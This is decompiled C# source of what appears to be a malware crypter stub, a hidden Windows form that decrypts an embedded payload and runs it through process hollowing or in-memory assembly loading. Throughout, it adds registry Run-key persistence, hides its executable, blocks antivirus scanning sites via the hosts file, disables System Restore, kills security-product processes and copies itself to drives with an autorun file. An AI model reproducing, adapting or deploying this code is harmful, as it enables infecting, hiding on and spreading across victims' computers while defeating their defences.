using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[DesignerGenerated]
public class Form1 : Form
{
	public class GClass0
	{
		private delegate bool Delegate0(string vr20, string vr18, IntPtr vr17, IntPtr vr16, bool vr15, int vr14, IntPtr vr13, string vr12, byte[] vr11, IntPtr[] vr10);

		private delegate bool Delegate1(IntPtr vr20, uint[] vr18);

		private delegate uint Delegate2(IntPtr vr20, IntPtr vr18);

		private delegate bool Delegate3(IntPtr vr20, IntPtr vr18, ref IntPtr vr17, IntPtr vr16, ref IntPtr vr15);

		private delegate int Delegate4(IntPtr vr20);

		private delegate IntPtr Delegate5(IntPtr vr20, IntPtr vr18, IntPtr vr17, int vr16, int vr15);

		private delegate bool Delegate6(IntPtr vr20, IntPtr vr18, byte[] vr17, IntPtr vr16, ref IntPtr vr15);

		[DebuggerNonUserCode]
		public GClass0()
		{
		}

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

		private static T smethod_0<T>(string string_0, string string_1)
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
		}

		public static void smethod_1(byte[] byte_0)
		{
			string string_ = string.Empty;
			string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + Form1.smethod_0("NO7YiYOc23ZBRVNhhg/NCMw0zP27C9DiSx71Xk44iiGqsiF/uIbbTg==", "SlRHnsUCHBn", bool_1: true));
			foreach (string text in directories)
			{
				if (text.Contains(Form1.smethod_0("6e8hxwPD0Zo=", "SNJ2NDabaep", bool_1: true)))
				{
					string_ = text + Form1.smethod_0("jUJTOgOFnLYGkzAgLse70A==", "SqLRBVioPWj", bool_1: true);
					break;
				}
			}
			smethod_2(byte_0, string_);
		}

		public static void smethod_2(byte[] byte_0, string string_0)
		{
			if (byte_0[60] == 128)
			{
				Thread thread = new Thread(smethod_3);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(byte_0);
				return;
			}
			int[] array = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num = BitConverter.ToInt32(byte_0, 60);
			checked
			{
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr vr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				byte[] vr2 = new byte[68];
				IntPtr[] array2 = new IntPtr[4];
				IntPtr intPtr = default(IntPtr);
				if (!smethod_0<Delegate0>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("bUoLoA7iLOfs5RzYGRFu/Q==", "SNAHrGrSRNe", bool_1: true))(null, string_0, intPtr, intPtr, vr15: false, 4, intPtr, null, vr2, array2))
				{
					return;
				}
				uint[] array3 = new uint[179];
				array3[0] = 65538u;
				if (smethod_0<Delegate1>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("a/BVkvVHtSlf6lYccArO1gGHSJpAYEA1", "SoVZH43CaWJ", bool_1: true))(array2[1], array3))
				{
					Delegate3 @delegate = smethod_0<Delegate3>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("2wYGW2bzl48IQ+zYWuRxUidb6jprHiHm", "SEUi9hOyMse", bool_1: true));
					IntPtr vr3 = array2[0];
					IntPtr vr4 = new IntPtr(unchecked((long)array3[41]) + 8L);
					IntPtr vr5 = new IntPtr(4);
					IntPtr vr6 = default(IntPtr);
					IntPtr vr7 = default(IntPtr);
					if (@delegate(vr3, vr4, ref vr6, vr5, ref vr7) && unchecked((long)smethod_0<Delegate2>(Form1.smethod_0("rpc5SUGTksE=", "SQhNgvMfpPO", bool_1: true), Form1.smethod_0("goeQF/lIRY40C7SA78HZEOSB+0BRQVio", "SEAXbFayGCi", bool_1: true))(array2[0], vr6)) == 0L)
					{
						Delegate5 delegate2 = smethod_0<Delegate5>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("uRfPaAqvZR4OU6Unl9t5tw==", "SsnxH2xM7I5", bool_1: true));
						IntPtr vr8 = array2[0];
						IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(byte_0, num + 52));
						IntPtr vr9 = intPtr2;
						IntPtr vr10 = new IntPtr(BitConverter.ToInt32(byte_0, num + 80));
						IntPtr vr11 = delegate2(vr8, vr9, vr10, 12288, 64);
						Delegate6 delegate3 = smethod_0<Delegate6>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("XfIeY2rqTT/04bOlogD7Zj4OL0jMZQ73", "SDpiYakjZf2", bool_1: true));
						delegate3(array2[0], vr11, byte_0, vr, ref vr7);
						int num3 = num2 - 1;
						int num4 = 0;
						while (true)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							int[] array4 = new int[10];
							Buffer.BlockCopy(byte_0, num + 248 + num4 * 40, array4, 0, 40);
							byte[] array5 = new byte[array4[4] - 1 + 1];
							IntPtr vr12 = new IntPtr(vr11.ToInt32() + array4[3]);
							int num7 = array5.Length;
							IntPtr vr13 = new IntPtr(num7);
							Buffer.BlockCopy(byte_0, array4[5], array5, 0, num7);
							delegate3(array2[0], vr12, array5, vr13, ref vr7);
							num4++;
						}
						IntPtr vr14 = array2[0];
						vr10 = new IntPtr(unchecked((long)array3[41]) + 8L);
						IntPtr vr15 = vr10;
						byte[] bytes = BitConverter.GetBytes(vr11.ToInt32());
						intPtr2 = new IntPtr(4);
						delegate3(vr14, vr15, bytes, intPtr2, ref vr7);
						array3[44] = (uint)(vr11.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
						smethod_0<Delegate1>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("vw0zlVHF9LNMzCUtXe3LisaQAHddFi2k", "SJrTdYsSq4g", bool_1: true))(array2[1], array3);
					}
				}
				smethod_0<Delegate4>(Form1.smethod_0("iSu85UAk/wNXzfh9pCsCJQ==", "SgHgRq5PkL6", bool_1: true), Form1.smethod_0("jH1v0rH8JCV8qeUU9IGZ3A==", "Sxu5TPhT5HN", bool_1: true))(array2[1]);
			}
		}

		private static void smethod_3(object object_0)
		{
			MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
	}

	public class GClass1
	{
		[DebuggerNonUserCode]
		public GClass1()
		{
		}

		public static void smethod_0()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Themes\\Defauts.exe";
				if (File.Exists(text))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(text);
				}
				File.Copy(Application.get_ExecutablePath(), text);
				((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_1()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Themes\\";
				((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + fileName, true);
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(fileName, text);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_2()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (File.Exists(folderPath + "\\Microsoft\\Internet Explorer\\" + fileName))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(folderPath + "\\Microsoft\\Internet Explorer\\" + fileName);
				}
				File.Copy(Application.get_ExecutablePath(), folderPath + "\\Microsoft\\Internet Explorer\\" + fileName);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Winlogon", (object)(folderPath + "\\Microsoft\\Internet Explorer\\" + fileName), RegistryValueKind.String);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_3()
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_4()
		{
			try
			{
				string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				string value = "\n 127.0.0.1 www.virustotal.com";
				string text = "\n 127.0.0.1 www.bitdefender.com";
				string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
				string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
				streamWriter.Write(value);
				streamWriter.Write("\r\n" + text);
				streamWriter.Write("\r\n" + text2);
				streamWriter.Write("\r\n" + text3);
				streamWriter.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_5()
		{
			try
			{
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_6()
		{
			try
			{
				string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_7()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_0007: Expected O, but got Unknown
			checked
			{
				try
				{
					ListBox val = new ListBox();
					for (int i = 0; i != ((ServerComputer)Class1.Class0_0).get_FileSystem().get_Drives().Count - 1; i++)
					{
						val.get_Items().Add((object)((ServerComputer)Class1.Class0_0).get_FileSystem().get_Drives()[i].ToString());
					}
					for (int i = 0; i != val.get_Items().get_Count(); i++)
					{
						try
						{
							try
							{
								((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe")));
								((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf")));
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe")));
							FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
							FileSystem.FilePut(1, "[autorun]\r\nshellexecute=CheckUSB.exe", -1L, false);
							FileSystem.FileClose(new int[1] { 1 });
							try
							{
								((ServerComputer)Class1.Class0_0).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
								((ServerComputer)Class1.Class0_0).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void smethod_8()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "outpost", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_9()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "npfmsg", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_10()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "bdagent", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_11()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "egui", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_12()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "zlclient", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private const string string_0 = "E8AZlw9BZn5kt5MAxm4DBEt5dFuXvEOVii3la4qjDfkaDky7zhRQhyXhlgw9JrvxL";

	private string string_1;

	private string string_2;

	private bool bool_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (list_0)
		{
			list_0.Add(new WeakReference(this));
		}
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		bool_0 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(1, 1);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		byte[] bytes = Class9.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "E8AZlw9BZn5kt5MAxm4DBEt5dFuXvEOVii3la4qjDfkaDky7zhRQhyXhlgw9JrvxL", -1, (CompareMethod)0);
		string text = array[1];
		string text2 = array[2];
		string text3 = array[6];
		string text4 = array[10];
		string text5 = array[11];
		string text6 = array[12];
		string text7 = array[13];
		string text8 = array[14];
		string text9 = array[15];
		string text10 = array[16];
		string text11 = array[17];
		string text12 = array[20];
		try
		{
			if (Operators.CompareString(text7, "Activated", false) == 0)
			{
				MessageBox.Show(text8, text9, (MessageBoxButtons)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text5, "own", false) == 0)
		{
			text5 = Process.GetCurrentProcess().MainModule!.FileName;
		}
		if (Operators.CompareString(text, "true", false) == 0)
		{
			GClass1.smethod_0();
		}
		if (Operators.CompareString(text, "star2", false) == 0)
		{
			GClass1.smethod_1();
		}
		if (Operators.CompareString(text, "star3", false) == 0)
		{
			GClass1.smethod_2();
		}
		if (Operators.CompareString(text3, "true", false) == 0)
		{
			GClass1.smethod_3();
		}
		if (Operators.CompareString(text10, "true", false) == 0)
		{
			GClass1.smethod_5();
		}
		if (Operators.CompareString(text11, "true", false) == 0)
		{
			GClass1.smethod_6();
		}
		if (Operators.CompareString(text4, "true", false) == 0)
		{
			GClass1.smethod_8();
			GClass1.smethod_9();
			GClass1.smethod_10();
			GClass1.smethod_11();
			GClass1.smethod_12();
		}
		if (Operators.CompareString(text6, "true", false) == 0)
		{
			GClass1.smethod_7();
		}
		if (Operators.CompareString(text12, "des", false) == 0)
		{
			string_1 = Class7.smethod_0(array[3], text2, bool_0: true);
		}
		else
		{
			string_1 = Class7.smethod_1(array[3], text2);
		}
		if (Operators.CompareString(text12, "Rijndael", false) == 0)
		{
			string_1 = Conversions.ToString(Class7.smethod_2(array[3], text2));
		}
		if (Operators.CompareString(text12, "XOR", false) == 0)
		{
			string_1 = Class7.smethod_3(array[3], text2);
		}
		bool flag = Class13.smethod_0();
		if (Operators.CompareString(array[7], "NULL", false) != 0)
		{
			try
			{
				byte[] bytes2 = method_3(array[7]);
				File.WriteAllBytes(string_2 + array[8], bytes2);
				Process.Start(string_2 + array[8]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			try
			{
				if (method_1())
				{
					Thread thread = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(Class7.smethod_0(array[3], text2, bool_0: true));
					((Form)this).Close();
				}
				else
				{
					Thread thread2 = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread2.TrySetApartmentState(ApartmentState.STA);
					byte[] bytes3 = Encoding.Default.GetBytes(string_1);
					try
					{
						thread2.Start(Class7.smethod_0(string_1, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", bool_0: true));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						GClass0.smethod_2(bytes3, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Process.GetCurrentProcess().Kill();
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			return;
		}
		try
		{
			if (method_1())
			{
				Thread thread3 = new Thread(delegate(object object_0)
				{
					method_2(Conversions.ToString(object_0));
				});
				thread3.TrySetApartmentState(ApartmentState.STA);
				thread3.Start(Class7.smethod_0(array[3], text2, bool_0: true));
				((Form)this).Close();
			}
			else
			{
				byte[] bytes4 = Encoding.Default.GetBytes(string_1);
				GClass0.smethod_2(bytes4, text5);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			Process.GetCurrentProcess().Kill();
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(byte[] byte_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	private bool method_1()
	{
		if (string_1.Contains("</assembly>"))
		{
			string[] array = Strings.Split(string_1, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public void method_2(string string_3)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(string_3);
		Thread thread = new Thread(delegate(object object_0)
		{
			method_0((byte[])object_0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	public byte[] method_3(string string_3)
	{
		if (string_3 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(string_3);
	}

	public static string smethod_0(string string_3, string string_4, bool bool_1)
	{
		byte[] array = Convert.FromBase64String(string_3);
		byte[] key;
		if (bool_1)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_4));
		}
		else
		{
			key = Encoding.UTF8.GetBytes(string_4);
		}
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_4(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_5(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_6(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_7(object object_0)
	{
		method_0((byte[])object_0);
	}
}
